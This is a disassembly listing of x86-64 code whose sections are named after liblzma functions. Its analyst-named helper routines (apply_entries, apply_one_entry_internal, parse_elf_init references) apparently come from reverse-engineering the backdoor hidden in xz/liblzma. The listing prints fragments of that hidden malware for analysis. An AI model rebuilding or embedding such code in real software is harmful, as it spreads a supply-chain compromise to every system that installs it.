.text.lzma_lzma_encoder_inia:000000000000A9C0 ; Segment permissions: Read/Execute
.text.lzma_lzma_encoder_inia:000000000000A9C0 _text_lzma_lzma_encoder_inia segment para public 'CODE' use64
.text.lzma_lzma_encoder_inia:000000000000A9C0                 assume cs:_text_lzma_lzma_encoder_inia
.text.lzma_lzma_encoder_inia:000000000000A9C0                 ;org 0A9C0h
.text.lzma_lzma_encoder_inia:000000000000A9C0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_lzma_encoder_inia:000000000000A9C0
.text.lzma_lzma_encoder_inia:000000000000A9C0 ; =============== S U B R O U T I N E =======================================
.text.lzma_lzma_encoder_inia:000000000000A9C0
.text.lzma_lzma_encoder_inia:000000000000A9C0
.text.lzma_lzma_encoder_inia:000000000000A9C0 ; __int64 __fastcall Llzma_lzma_encoder_init_0(__int64, unsigned int *)
.text.lzma_lzma_encoder_inia:000000000000A9C0 _Llzma_lzma_encoder_init_0 proc near    ; CODE XREF: apply_method_2+92↓p
.text.lzma_lzma_encoder_inia:000000000000A9C0                 endbr64
.text.lzma_lzma_encoder_inia:000000000000A9C4                 mov     eax, [rsi]
.text.lzma_lzma_encoder_inia:000000000000A9C6                 mov     rdx, rsi
.text.lzma_lzma_encoder_inia:000000000000A9C9                 cmp     eax, 1C7h
.text.lzma_lzma_encoder_inia:000000000000A9CE                 ja      short loc_AA29
.text.lzma_lzma_encoder_inia:000000000000A9D0                 mov     ecx, [rdi+28h]
.text.lzma_lzma_encoder_inia:000000000000A9D3                 lea     edi, [rax+1]
.text.lzma_lzma_encoder_inia:000000000000A9D6                 cmp     ecx, 109h
.text.lzma_lzma_encoder_inia:000000000000A9DC                 jz      short loc_AA27
.text.lzma_lzma_encoder_inia:000000000000A9DE                 cmp     ecx, 0BBh
.text.lzma_lzma_encoder_inia:000000000000A9E4                 jz      short loc_AA27
.text.lzma_lzma_encoder_inia:000000000000A9E6                 sub     ecx, 83h
.text.lzma_lzma_encoder_inia:000000000000A9EC                 cmp     ecx, 2Eh ; '.'
.text.lzma_lzma_encoder_inia:000000000000A9EF                 ja      short loc_AA04
.text.lzma_lzma_encoder_inia:000000000000A9F1                 mov     rsi, 410100000101h
.text.lzma_lzma_encoder_inia:000000000000A9FB                 shr     rsi, cl
.text.lzma_lzma_encoder_inia:000000000000A9FE                 and     sil, 1
.text.lzma_lzma_encoder_inia:000000000000AA02                 jnz     short loc_AA27
.text.lzma_lzma_encoder_inia:000000000000AA04
.text.lzma_lzma_encoder_inia:000000000000AA04 loc_AA04:                               ; CODE XREF: _Llzma_lzma_encoder_init_0+2F↑j
.text.lzma_lzma_encoder_inia:000000000000AA04                 mov     rcx, offset global_ctx
.text.lzma_lzma_encoder_inia:000000000000AA0B                 mov     esi, eax
.text.lzma_lzma_encoder_inia:000000000000AA0D                 and     eax, 7
.text.lzma_lzma_encoder_inia:000000000000AA10                 shr     esi, 3
.text.lzma_lzma_encoder_inia:000000000000AA13                 mov     r8, [rcx]
.text.lzma_lzma_encoder_inia:000000000000AA16                 mov     ecx, eax
.text.lzma_lzma_encoder_inia:000000000000AA18                 mov     eax, 1
.text.lzma_lzma_encoder_inia:000000000000AA1D                 shl     eax, cl
.text.lzma_lzma_encoder_inia:000000000000AA1F                 or      [r8+rsi+108h], al
.text.lzma_lzma_encoder_inia:000000000000AA27
.text.lzma_lzma_encoder_inia:000000000000AA27 loc_AA27:                               ; CODE XREF: _Llzma_lzma_encoder_init_0+1C↑j
.text.lzma_lzma_encoder_inia:000000000000AA27                                         ; _Llzma_lzma_encoder_init_0+24↑j ...
.text.lzma_lzma_encoder_inia:000000000000AA27                 mov     [rdx], edi
.text.lzma_lzma_encoder_inia:000000000000AA29
.text.lzma_lzma_encoder_inia:000000000000AA29 loc_AA29:                               ; CODE XREF: _Llzma_lzma_encoder_init_0+E↑j
.text.lzma_lzma_encoder_inia:000000000000AA29                 mov     eax, 1
.text.lzma_lzma_encoder_inia:000000000000AA2E                 retn
.text.lzma_lzma_encoder_inia:000000000000AA2E _Llzma_lzma_encoder_init_0 endp
.text.lzma_lzma_encoder_inia:000000000000AA2E
.text.lzma_lzma_encoder_inia:000000000000AA2E _text_lzma_lzma_encoder_inia ends
.text.lzma_lzma_encoder_inia:000000000000AA2E
.text.lzma_memlimit_gea:000000000000AA30 ; ===========================================================================
.text.lzma_memlimit_gea:000000000000AA30
.text.lzma_memlimit_gea:000000000000AA30 ; Segment type: Pure code
.text.lzma_memlimit_gea:000000000000AA30 ; Segment permissions: Read/Execute
.text.lzma_memlimit_gea:000000000000AA30 _text_lzma_memlimit_gea segment para public 'CODE' use64
.text.lzma_memlimit_gea:000000000000AA30                 assume cs:_text_lzma_memlimit_gea
.text.lzma_memlimit_gea:000000000000AA30                 ;org 0AA30h
.text.lzma_memlimit_gea:000000000000AA30                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_memlimit_gea:000000000000AA30
.text.lzma_memlimit_gea:000000000000AA30 ; =============== S U B R O U T I N E =======================================
.text.lzma_memlimit_gea:000000000000AA30
.text.lzma_memlimit_gea:000000000000AA30
.text.lzma_memlimit_gea:000000000000AA30 ; _BOOL8 __fastcall apply_method_2(__int64, __int64, int, unsigned int, int)
.text.lzma_memlimit_gea:000000000000AA30                 public apply_method_2
.text.lzma_memlimit_gea:000000000000AA30 apply_method_2  proc near               ; CODE XREF: apply_one_entry_internal+8D↓p
.text.lzma_memlimit_gea:000000000000AA30
.text.lzma_memlimit_gea:000000000000AA30 var_A8          = qword ptr -0A8h
.text.lzma_memlimit_gea:000000000000AA30 var_9C          = dword ptr -9Ch
.text.lzma_memlimit_gea:000000000000AA30 var_90          = qword ptr -90h
.text.lzma_memlimit_gea:000000000000AA30 var_88          = qword ptr -88h
.text.lzma_memlimit_gea:000000000000AA30
.text.lzma_memlimit_gea:000000000000AA30                 endbr64
.text.lzma_memlimit_gea:000000000000AA34                 push    r15
.text.lzma_memlimit_gea:000000000000AA36                 xor     eax, eax
.text.lzma_memlimit_gea:000000000000AA38                 mov     r9, rdi
.text.lzma_memlimit_gea:000000000000AA3B                 push    r14
.text.lzma_memlimit_gea:000000000000AA3D                 push    r13
.text.lzma_memlimit_gea:000000000000AA3F                 push    r12
.text.lzma_memlimit_gea:000000000000AA41                 push    rbp
.text.lzma_memlimit_gea:000000000000AA42                 push    rbx
.text.lzma_memlimit_gea:000000000000AA43                 mov     ebx, ecx
.text.lzma_memlimit_gea:000000000000AA45                 mov     ecx, 16h
.text.lzma_memlimit_gea:000000000000AA4A                 sub     rsp, 78h
.text.lzma_memlimit_gea:000000000000AA4E                 test    r8d, r8d
.text.lzma_memlimit_gea:000000000000AA51                 lea     rdi, [rsp+0A8h+var_90]
.text.lzma_memlimit_gea:000000000000AA56                 mov     [rsp+0A8h+var_A8], rsi
.text.lzma_memlimit_gea:000000000000AA5A                 lea     r13, [rsp+0A8h+var_90]
.text.lzma_memlimit_gea:000000000000AA5F                 rep stosd
.text.lzma_memlimit_gea:000000000000AA61                 mov     [rsp+0A8h+var_9C], edx
.text.lzma_memlimit_gea:000000000000AA65                 jz      short loc_AA86
.text.lzma_memlimit_gea:000000000000AA67                 xor     edx, edx
.text.lzma_memlimit_gea:000000000000AA69                 mov     rcx, r13
.text.lzma_memlimit_gea:000000000000AA6C                 mov     rdi, r9
.text.lzma_memlimit_gea:000000000000AA6F                 call    _Llzma_optimum_normal_0 ; PIC mode
.text.lzma_memlimit_gea:000000000000AA74                 test    eax, eax
.text.lzma_memlimit_gea:000000000000AA76                 jnz     short loc_AA7C
.text.lzma_memlimit_gea:000000000000AA78
.text.lzma_memlimit_gea:000000000000AA78 loc_AA78:                               ; CODE XREF: apply_method_2+7E↓j
.text.lzma_memlimit_gea:000000000000AA78                                         ; apply_method_2+99↓j
.text.lzma_memlimit_gea:000000000000AA78                 xor     eax, eax
.text.lzma_memlimit_gea:000000000000AA7A                 jmp     short loc_AAD7
.text.lzma_memlimit_gea:000000000000AA7C ; ---------------------------------------------------------------------------
.text.lzma_memlimit_gea:000000000000AA7C
.text.lzma_memlimit_gea:000000000000AA7C loc_AA7C:                               ; CODE XREF: apply_method_2+46↑j
.text.lzma_memlimit_gea:000000000000AA7C                 mov     r9, [rsp+0A8h+var_88]
.text.lzma_memlimit_gea:000000000000AA81                 add     r9, [rsp+0A8h+var_90]
.text.lzma_memlimit_gea:000000000000AA86
.text.lzma_memlimit_gea:000000000000AA86 loc_AA86:                               ; CODE XREF: apply_method_2+35↑j
.text.lzma_memlimit_gea:000000000000AA86                 mov     r14d, ebx
.text.lzma_memlimit_gea:000000000000AA89                 xor     r12d, r12d
.text.lzma_memlimit_gea:000000000000AA8C                 lea     r15, [rsp+0A8h+var_9C]
.text.lzma_memlimit_gea:000000000000AA91
.text.lzma_memlimit_gea:000000000000AA91 loc_AA91:                               ; CODE XREF: apply_method_2+A5↓j
.text.lzma_memlimit_gea:000000000000AA91                 mov     rsi, [rsp+0A8h+var_A8]
.text.lzma_memlimit_gea:000000000000AA95                 mov     rdx, r13
.text.lzma_memlimit_gea:000000000000AA98                 mov     rdi, r9
.text.lzma_memlimit_gea:000000000000AA9B                 mov     ebp, r12d
.text.lzma_memlimit_gea:000000000000AA9E                 call    _Llzma_block_total_size_0 ; PIC mode
.text.lzma_memlimit_gea:000000000000AAA3                 test    eax, eax
.text.lzma_memlimit_gea:000000000000AAA5                 jz      short loc_AAB0
.text.lzma_memlimit_gea:000000000000AAA7                 cmp     r12, r14
.text.lzma_memlimit_gea:000000000000AAAA                 jnz     short loc_AAB9
.text.lzma_memlimit_gea:000000000000AAAC                 cmp     ebx, ebp
.text.lzma_memlimit_gea:000000000000AAAE                 jb      short loc_AA78
.text.lzma_memlimit_gea:000000000000AAB0
.text.lzma_memlimit_gea:000000000000AAB0 loc_AAB0:                               ; CODE XREF: apply_method_2+75↑j
.text.lzma_memlimit_gea:000000000000AAB0                 xor     eax, eax
.text.lzma_memlimit_gea:000000000000AAB2                 cmp     ebx, ebp
.text.lzma_memlimit_gea:000000000000AAB4                 setz    al
.text.lzma_memlimit_gea:000000000000AAB7                 jmp     short loc_AAD7
.text.lzma_memlimit_gea:000000000000AAB9 ; ---------------------------------------------------------------------------
.text.lzma_memlimit_gea:000000000000AAB9
.text.lzma_memlimit_gea:000000000000AAB9 loc_AAB9:                               ; CODE XREF: apply_method_2+7A↑j
.text.lzma_memlimit_gea:000000000000AAB9                 mov     rsi, r15
.text.lzma_memlimit_gea:000000000000AABC                 mov     rdi, r13
.text.lzma_memlimit_gea:000000000000AABF                 inc     r12
.text.lzma_memlimit_gea:000000000000AAC2                 call    _Llzma_lzma_encoder_init_0 ; PIC mode
.text.lzma_memlimit_gea:000000000000AAC7                 test    eax, eax
.text.lzma_memlimit_gea:000000000000AAC9                 jz      short loc_AA78
.text.lzma_memlimit_gea:000000000000AACB                 mov     r9, [rsp+0A8h+var_88]
.text.lzma_memlimit_gea:000000000000AAD0                 add     r9, [rsp+0A8h+var_90]
.text.lzma_memlimit_gea:000000000000AAD5                 jmp     short loc_AA91
.text.lzma_memlimit_gea:000000000000AAD7 ; ---------------------------------------------------------------------------
.text.lzma_memlimit_gea:000000000000AAD7
.text.lzma_memlimit_gea:000000000000AAD7 loc_AAD7:                               ; CODE XREF: apply_method_2+4A↑j
.text.lzma_memlimit_gea:000000000000AAD7                                         ; apply_method_2+87↑j
.text.lzma_memlimit_gea:000000000000AAD7                 add     rsp, 78h
.text.lzma_memlimit_gea:000000000000AADB                 pop     rbx
.text.lzma_memlimit_gea:000000000000AADC                 pop     rbp
.text.lzma_memlimit_gea:000000000000AADD                 pop     r12
.text.lzma_memlimit_gea:000000000000AADF                 pop     r13
.text.lzma_memlimit_gea:000000000000AAE1                 pop     r14
.text.lzma_memlimit_gea:000000000000AAE3                 pop     r15
.text.lzma_memlimit_gea:000000000000AAE5                 retn
.text.lzma_memlimit_gea:000000000000AAE5 apply_method_2  endp
.text.lzma_memlimit_gea:000000000000AAE5
.text.lzma_memlimit_gea:000000000000AAE5 _text_lzma_memlimit_gea ends
.text.lzma_memlimit_gea:000000000000AAE5
.text.rc_read_inis:000000000000AAF0 ; ===========================================================================
.text.rc_read_inis:000000000000AAF0
.text.rc_read_inis:000000000000AAF0 ; Segment type: Pure code
.text.rc_read_inis:000000000000AAF0 ; Segment permissions: Read/Execute
.text.rc_read_inis:000000000000AAF0 _text_rc_read_inis segment para public 'CODE' use64
.text.rc_read_inis:000000000000AAF0                 assume cs:_text_rc_read_inis
.text.rc_read_inis:000000000000AAF0                 ;org 0AAF0h
.text.rc_read_inis:000000000000AAF0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.rc_read_inis:000000000000AAF0
.text.rc_read_inis:000000000000AAF0 ; =============== S U B R O U T I N E =======================================
.text.rc_read_inis:000000000000AAF0
.text.rc_read_inis:000000000000AAF0
.text.rc_read_inis:000000000000AAF0 ; __int64 __fastcall apply_one_entry_internal(__int64, _DWORD *, unsigned int, unsigned int, unsigned int)
.text.rc_read_inis:000000000000AAF0                 public apply_one_entry_internal
.text.rc_read_inis:000000000000AAF0 apply_one_entry_internal proc near      ; CODE XREF: apply_one_entry+17↓j
.text.rc_read_inis:000000000000AAF0                                         ; apply_one_entry_ex+1E↓p ...
.text.rc_read_inis:000000000000AAF0
.text.rc_read_inis:000000000000AAF0 var_30          = qword ptr -30h
.text.rc_read_inis:000000000000AAF0
.text.rc_read_inis:000000000000AAF0                 endbr64
.text.rc_read_inis:000000000000AAF4                 push    r13
.text.rc_read_inis:000000000000AAF6                 xor     eax, eax
.text.rc_read_inis:000000000000AAF8                 push    r12
.text.rc_read_inis:000000000000AAFA                 push    rbp
.text.rc_read_inis:000000000000AAFB                 push    rbx
.text.rc_read_inis:000000000000AAFC                 sub     rsp, 18h
.text.rc_read_inis:000000000000AB00                 mov     r12, offset global_ctx
.text.rc_read_inis:000000000000AB07                 mov     [rsp+38h+var_30], rax
.text.rc_read_inis:000000000000AB0C                 mov     rax, [r12]
.text.rc_read_inis:000000000000AB10                 test    rax, rax
.text.rc_read_inis:000000000000AB13                 jz      short loc_AB90
.text.rc_read_inis:000000000000AB15                 mov     r8d, r8d
.text.rc_read_inis:000000000000AB18                 cmp     byte ptr [rax+r8+141h], 0
.text.rc_read_inis:000000000000AB21                 jnz     short loc_AB90
.text.rc_read_inis:000000000000AB23                 mov     byte ptr [rax+r8+141h], 1
.text.rc_read_inis:000000000000AB2C                 mov     ebx, ecx
.text.rc_read_inis:000000000000AB2E                 mov     r13, rdi
.text.rc_read_inis:000000000000AB31                 mov     ebp, edx
.text.rc_read_inis:000000000000AB33                 mov     rcx, [rax+80h]
.text.rc_read_inis:000000000000AB3A                 mov     r8, [rax+88h]
.text.rc_read_inis:000000000000AB41                 mov     rdi, rsi
.text.rc_read_inis:000000000000AB44                 xor     edx, edx
.text.rc_read_inis:000000000000AB46                 lea     rsi, [rsp+38h+var_30]
.text.rc_read_inis:000000000000AB4B                 mov     r9d, 1
.text.rc_read_inis:000000000000AB51                 call    apply_method_1  ; PIC mode
.text.rc_read_inis:000000000000AB56                 test    eax, eax
.text.rc_read_inis:000000000000AB58                 jnz     short loc_AB5E
.text.rc_read_inis:000000000000AB5A
.text.rc_read_inis:000000000000AB5A loc_AB5A:                               ; CODE XREF: apply_one_entry_internal+94↓j
.text.rc_read_inis:000000000000AB5A                 xor     eax, eax
.text.rc_read_inis:000000000000AB5C                 jmp     short loc_AB95
.text.rc_read_inis:000000000000AB5E ; ---------------------------------------------------------------------------
.text.rc_read_inis:000000000000AB5E
.text.rc_read_inis:000000000000AB5E loc_AB5E:                               ; CODE XREF: apply_one_entry_internal+68↑j
.text.rc_read_inis:000000000000AB5E                 mov     rax, [r12]
.text.rc_read_inis:000000000000AB62                 test    r13, r13
.text.rc_read_inis:000000000000AB65                 mov     rdi, [rsp+38h+var_30]
.text.rc_read_inis:000000000000AB6A                 mov     ecx, ebx
.text.rc_read_inis:000000000000AB6C                 setz    r8b
.text.rc_read_inis:000000000000AB70                 mov     edx, ebp
.text.rc_read_inis:000000000000AB72                 mov     rsi, [rax+88h]
.text.rc_read_inis:000000000000AB79                 movzx   r8d, r8b
.text.rc_read_inis:000000000000AB7D                 call    apply_method_2  ; PIC mode
.text.rc_read_inis:000000000000AB82                 test    eax, eax
.text.rc_read_inis:000000000000AB84                 jz      short loc_AB5A
.text.rc_read_inis:000000000000AB86                 mov     rax, [r12]
.text.rc_read_inis:000000000000AB8A                 add     [rax+160h], ebx
.text.rc_read_inis:000000000000AB90
.text.rc_read_inis:000000000000AB90 loc_AB90:                               ; CODE XREF: apply_one_entry_internal+23↑j
.text.rc_read_inis:000000000000AB90                                         ; apply_one_entry_internal+31↑j
.text.rc_read_inis:000000000000AB90                 mov     eax, 1
.text.rc_read_inis:000000000000AB95
.text.rc_read_inis:000000000000AB95 loc_AB95:                               ; CODE XREF: apply_one_entry_internal+6C↑j
.text.rc_read_inis:000000000000AB95                 add     rsp, 18h
.text.rc_read_inis:000000000000AB99                 pop     rbx
.text.rc_read_inis:000000000000AB9A                 pop     rbp
.text.rc_read_inis:000000000000AB9B                 pop     r12
.text.rc_read_inis:000000000000AB9D                 pop     r13
.text.rc_read_inis:000000000000AB9F                 retn
.text.rc_read_inis:000000000000AB9F apply_one_entry_internal endp
.text.rc_read_inis:000000000000AB9F
.text.rc_read_inis:000000000000AB9F _text_rc_read_inis ends
.text.rc_read_inis:000000000000AB9F
.text.lzma_check_inia:000000000000ABA0 ; ===========================================================================
.text.lzma_check_inia:000000000000ABA0
.text.lzma_check_inia:000000000000ABA0 ; Segment type: Pure code
.text.lzma_check_inia:000000000000ABA0 ; Segment permissions: Read/Execute
.text.lzma_check_inia:000000000000ABA0 _text_lzma_check_inia segment para public 'CODE' use64
.text.lzma_check_inia:000000000000ABA0                 assume cs:_text_lzma_check_inia
.text.lzma_check_inia:000000000000ABA0                 ;org 0ABA0h
.text.lzma_check_inia:000000000000ABA0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_check_inia:000000000000ABA0
.text.lzma_check_inia:000000000000ABA0 ; =============== S U B R O U T I N E =======================================
.text.lzma_check_inia:000000000000ABA0
.text.lzma_check_inia:000000000000ABA0
.text.lzma_check_inia:000000000000ABA0 ; __int64 __fastcall apply_one_entry(unsigned int, unsigned int, unsigned int, int, _DWORD *)
.text.lzma_check_inia:000000000000ABA0 apply_one_entry proc near               ; CODE XREF: parse_elf_init+14C2↑p
.text.lzma_check_inia:000000000000ABA0                                         ; parse_elf_init+150F↑p ...
.text.lzma_check_inia:000000000000ABA0                 endbr64
.text.lzma_check_inia:000000000000ABA4                 mov     eax, edi
.text.lzma_check_inia:000000000000ABA6                 mov     rdi, r8
.text.lzma_check_inia:000000000000ABA9                 test    ecx, ecx
.text.lzma_check_inia:000000000000ABAB                 jz      short loc_ABBC
.text.lzma_check_inia:000000000000ABAD                 mov     r8d, esi
.text.lzma_check_inia:000000000000ABB0                 mov     ecx, edx
.text.lzma_check_inia:000000000000ABB2                 mov     rsi, rdi
.text.lzma_check_inia:000000000000ABB5                 mov     edx, eax
.text.lzma_check_inia:000000000000ABB7                 jmp     apply_one_entry_internal ; PIC mode
.text.lzma_check_inia:000000000000ABBC ; ---------------------------------------------------------------------------
.text.lzma_check_inia:000000000000ABBC
.text.lzma_check_inia:000000000000ABBC loc_ABBC:                               ; CODE XREF: apply_one_entry+B↑j
.text.lzma_check_inia:000000000000ABBC                 xor     eax, eax
.text.lzma_check_inia:000000000000ABBE                 retn
.text.lzma_check_inia:000000000000ABBE apply_one_entry endp
.text.lzma_check_inia:000000000000ABBE
.text.lzma_check_inia:000000000000ABBE _text_lzma_check_inia ends
.text.lzma_check_inia:000000000000ABBE
.text.lzma2_decoder_ena:000000000000ABC0 ; ===========================================================================
.text.lzma2_decoder_ena:000000000000ABC0
.text.lzma2_decoder_ena:000000000000ABC0 ; Segment type: Pure code
.text.lzma2_decoder_ena:000000000000ABC0 ; Segment permissions: Read/Execute
.text.lzma2_decoder_ena:000000000000ABC0 _text_lzma2_decoder_ena segment para public 'CODE' use64
.text.lzma2_decoder_ena:000000000000ABC0                 assume cs:_text_lzma2_decoder_ena
.text.lzma2_decoder_ena:000000000000ABC0                 ;org 0ABC0h
.text.lzma2_decoder_ena:000000000000ABC0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma2_decoder_ena:000000000000ABC0
.text.lzma2_decoder_ena:000000000000ABC0 ; =============== S U B R O U T I N E =======================================
.text.lzma2_decoder_ena:000000000000ABC0
.text.lzma2_decoder_ena:000000000000ABC0
.text.lzma2_decoder_ena:000000000000ABC0 ; _BOOL8 __fastcall apply_one_entry_ex(unsigned __int64, unsigned int, unsigned int, unsigned int)
.text.lzma2_decoder_ena:000000000000ABC0 apply_one_entry_ex proc near            ; CODE XREF: code_dasm+26↑p
.text.lzma2_decoder_ena:000000000000ABC0                                         ; _Llzma_optimum_normal_0+2B↑p ...
.text.lzma2_decoder_ena:000000000000ABC0                 endbr64
.text.lzma2_decoder_ena:000000000000ABC4                 mov     rax, rdi
.text.lzma2_decoder_ena:000000000000ABC7                 push    r8
.text.lzma2_decoder_ena:000000000000ABC9                 mov     r8d, ecx
.text.lzma2_decoder_ena:000000000000ABCC                 cmp     rdi, 1
.text.lzma2_decoder_ena:000000000000ABD0                 ja      short loc_ABD7
.text.lzma2_decoder_ena:000000000000ABD2                 mov     rax, [rsp+8]
.text.lzma2_decoder_ena:000000000000ABD7
.text.lzma2_decoder_ena:000000000000ABD7 loc_ABD7:                               ; CODE XREF: apply_one_entry_ex+10↑j
.text.lzma2_decoder_ena:000000000000ABD7                 mov     ecx, edx
.text.lzma2_decoder_ena:000000000000ABD9                 mov     edx, esi
.text.lzma2_decoder_ena:000000000000ABDB                 mov     rsi, rax
.text.lzma2_decoder_ena:000000000000ABDE                 call    apply_one_entry_internal ; PIC mode
.text.lzma2_decoder_ena:000000000000ABE3                 pop     rdx
.text.lzma2_decoder_ena:000000000000ABE4                 test    eax, eax
.text.lzma2_decoder_ena:000000000000ABE6                 setnle  al
.text.lzma2_decoder_ena:000000000000ABE9                 movzx   eax, al
.text.lzma2_decoder_ena:000000000000ABEC                 retn
.text.lzma2_decoder_ena:000000000000ABEC apply_one_entry_ex endp
.text.lzma2_decoder_ena:000000000000ABEC
.text.lzma2_decoder_ena:000000000000ABEC _text_lzma2_decoder_ena ends
.text.lzma2_decoder_ena:000000000000ABEC
.text.lzma_index_iter_rewina:000000000000ABF0 ; ===========================================================================
.text.lzma_index_iter_rewina:000000000000ABF0
.text.lzma_index_iter_rewina:000000000000ABF0 ; Segment type: Pure code
.text.lzma_index_iter_rewina:000000000000ABF0 ; Segment permissions: Read/Execute
.text.lzma_index_iter_rewina:000000000000ABF0 _text_lzma_index_iter_rewina segment para public 'CODE' use64
.text.lzma_index_iter_rewina:000000000000ABF0                 assume cs:_text_lzma_index_iter_rewina
.text.lzma_index_iter_rewina:000000000000ABF0                 ;org 0ABF0h
.text.lzma_index_iter_rewina:000000000000ABF0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_index_iter_rewina:000000000000ABF0
.text.lzma_index_iter_rewina:000000000000ABF0 ; =============== S U B R O U T I N E =======================================
.text.lzma_index_iter_rewina:000000000000ABF0
.text.lzma_index_iter_rewina:000000000000ABF0
.text.lzma_index_iter_rewina:000000000000ABF0 ; __int64 __fastcall Llzma_index_iter_rewind_cold(unsigned int, unsigned int, unsigned int, int)
.text.lzma_index_iter_rewina:000000000000ABF0 _Llzma_index_iter_rewind_cold proc near ; CODE XREF: _Llzma_raw_encoder_0+2A↑p
.text.lzma_index_iter_rewina:000000000000ABF0                                         ; _Llzma_mt_block_size_1+28↑p ...
.text.lzma_index_iter_rewina:000000000000ABF0                 endbr64
.text.lzma_index_iter_rewina:000000000000ABF4                 push    rbx
.text.lzma_index_iter_rewina:000000000000ABF5                 mov     ebx, ecx
.text.lzma_index_iter_rewina:000000000000ABF7                 mov     ecx, esi
.text.lzma_index_iter_rewina:000000000000ABF9                 mov     rsi, [rsp+8]
.text.lzma_index_iter_rewina:000000000000ABFE                 mov     r8d, edx
.text.lzma_index_iter_rewina:000000000000AC01                 mov     edx, edi
.text.lzma_index_iter_rewina:000000000000AC03                 xor     edi, edi
.text.lzma_index_iter_rewina:000000000000AC05                 call    apply_one_entry_internal ; PIC mode
.text.lzma_index_iter_rewina:000000000000AC0A                 or      eax, ebx
.text.lzma_index_iter_rewina:000000000000AC0C                 pop     rbx
.text.lzma_index_iter_rewina:000000000000AC0D                 retn
.text.lzma_index_iter_rewina:000000000000AC0D _Llzma_index_iter_rewind_cold endp
.text.lzma_index_iter_rewina:000000000000AC0D
.text.lzma_index_iter_rewina:000000000000AC0D _text_lzma_index_iter_rewina ends
.text.lzma_index_iter_rewina:000000000000AC0D
.text.lzma_index_memusagz:000000000000AC10 ; ===========================================================================
.text.lzma_index_memusagz:000000000000AC10
.text.lzma_index_memusagz:000000000000AC10 ; Segment type: Pure code
.text.lzma_index_memusagz:000000000000AC10 ; Segment permissions: Read/Execute
.text.lzma_index_memusagz:000000000000AC10 _text_lzma_index_memusagz segment para public 'CODE' use64
.text.lzma_index_memusagz:000000000000AC10                 assume cs:_text_lzma_index_memusagz
.text.lzma_index_memusagz:000000000000AC10                 ;org 0AC10h
.text.lzma_index_memusagz:000000000000AC10                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_index_memusagz:000000000000AC10
.text.lzma_index_memusagz:000000000000AC10 ; =============== S U B R O U T I N E =======================================
.text.lzma_index_memusagz:000000000000AC10
.text.lzma_index_memusagz:000000000000AC10
.text.lzma_index_memusagz:000000000000AC10 ; __int64 __fastcall apply_entries(__int64, unsigned __int64, __int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD))
.text.lzma_index_memusagz:000000000000AC10                 public apply_entries
.text.lzma_index_memusagz:000000000000AC10 apply_entries   proc near               ; CODE XREF: install_entries+FF↑p
.text.lzma_index_memusagz:000000000000AC10                 endbr64
.text.lzma_index_memusagz:000000000000AC14                 push    r14
.text.lzma_index_memusagz:000000000000AC16                 xor     r14d, r14d
.text.lzma_index_memusagz:000000000000AC19                 push    r13
.text.lzma_index_memusagz:000000000000AC1B                 mov     r13, rdx
.text.lzma_index_memusagz:000000000000AC1E                 push    r12
.text.lzma_index_memusagz:000000000000AC20                 mov     r12, rdi
.text.lzma_index_memusagz:000000000000AC23                 push    rbp
.text.lzma_index_memusagz:000000000000AC24                 xor     ebp, ebp
.text.lzma_index_memusagz:000000000000AC26                 push    rbx
.text.lzma_index_memusagz:000000000000AC27                 mov     rbx, rsi
.text.lzma_index_memusagz:000000000000AC2A
.text.lzma_index_memusagz:000000000000AC2A loc_AC2A:                               ; CODE XREF: apply_entries+4A↓j
.text.lzma_index_memusagz:000000000000AC2A                                         ; apply_entries+4F↓j
.text.lzma_index_memusagz:000000000000AC2A                 mov     eax, r14d
.text.lzma_index_memusagz:000000000000AC2D                 cmp     rax, rbx
.text.lzma_index_memusagz:000000000000AC30                 jnb     short loc_AC61
.text.lzma_index_memusagz:000000000000AC32                 imul    rax, 18h
.text.lzma_index_memusagz:000000000000AC36                 inc     r14d
.text.lzma_index_memusagz:000000000000AC39                 add     rax, r12
.text.lzma_index_memusagz:000000000000AC3C                 cmp     dword ptr [rax+14h], 0
.text.lzma_index_memusagz:000000000000AC40                 mov     r8, [rax]
.text.lzma_index_memusagz:000000000000AC43                 mov     edi, [rax+8]
.text.lzma_index_memusagz:000000000000AC46                 mov     esi, [rax+0Ch]
.text.lzma_index_memusagz:000000000000AC49                 mov     edx, [rax+10h]
.text.lzma_index_memusagz:000000000000AC4C                 jz      short loc_AC5C
.text.lzma_index_memusagz:000000000000AC4E                 mov     ecx, r14d
.text.lzma_index_memusagz:000000000000AC51                 call    r13
.text.lzma_index_memusagz:000000000000AC54                 test    eax, eax
.text.lzma_index_memusagz:000000000000AC56                 jz      short loc_AC66
.text.lzma_index_memusagz:000000000000AC58                 inc     ebp
.text.lzma_index_memusagz:000000000000AC5A                 jmp     short loc_AC2A
.text.lzma_index_memusagz:000000000000AC5C ; ---------------------------------------------------------------------------
.text.lzma_index_memusagz:000000000000AC5C
.text.lzma_index_memusagz:000000000000AC5C loc_AC5C:                               ; CODE XREF: apply_entries+3C↑j
.text.lzma_index_memusagz:000000000000AC5C                 mov     [rax+14h], ebp
.text.lzma_index_memusagz:000000000000AC5F                 jmp     short loc_AC2A
.text.lzma_index_memusagz:000000000000AC61 ; ---------------------------------------------------------------------------
.text.lzma_index_memusagz:000000000000AC61
.text.lzma_index_memusagz:000000000000AC61 loc_AC61:                               ; CODE XREF: apply_entries+20↑j
.text.lzma_index_memusagz:000000000000AC61                 mov     eax, 1
.text.lzma_index_memusagz:000000000000AC66
.text.lzma_index_memusagz:000000000000AC66 loc_AC66:                               ; CODE XREF: apply_entries+46↑j
.text.lzma_index_memusagz:000000000000AC66                 pop     rbx
.text.lzma_index_memusagz:000000000000AC67                 pop     rbp
.text.lzma_index_memusagz:000000000000AC68                 pop     r12
.text.lzma_index_memusagz:000000000000AC6A                 pop     r13
.text.lzma_index_memusagz:000000000000AC6C                 pop     r14
.text.lzma_index_memusagz:000000000000AC6E                 retn
.text.lzma_index_memusagz:000000000000AC6E apply_entries   endp
.text.lzma_index_memusagz:000000000000AC6E
.text.lzma_index_memusagz:000000000000AC6E _text_lzma_index_memusagz ends
.text.lzma_index_memusagz:000000000000AC6E
.text.lzma_block_total_siza:000000000000AC70 ; ===========================================================================
